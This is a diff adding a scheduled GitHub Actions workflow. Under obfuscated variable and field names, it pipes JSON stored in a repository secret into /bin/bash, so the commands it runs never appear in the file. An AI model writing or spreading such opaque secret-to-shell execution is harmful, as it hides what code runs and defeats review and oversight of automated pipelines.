@@ -1,0 +1,28 @@
+name: wurenwenfeng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wurenwenfeng
+        env:
+          mn86: ${{ secrets.mn86 }}
+        run: |
+          echo $mn86 | jq -r .okptl2446 | /bin/bash
+          echo $vowky2719 | jq -r .wr2052 | /bin/bash
+          echo $ye3 | jq -r .dy77 | /bin/bash
+          echo $pio2528 | jq -r .c791 | /bin/bash
+          echo $lk75434 | jq -r .mx2 | /bin/bash
+          echo $pmx671 | jq -r .mpp6457 | /bin/bash
+          echo $auf210 | jq -r .bzh74104 | /bin/bash
+          echo $nojfy7 | jq -r .kwup8378 | /bin/bash
+          echo $nmas7540 | jq -r .rpr787 | /bin/bash
+          echo $kd4691 | jq -r .opjq76 | /bin/bash
+          echo $yuknv98 | jq -r .ztdre277 | /bin/bash
+
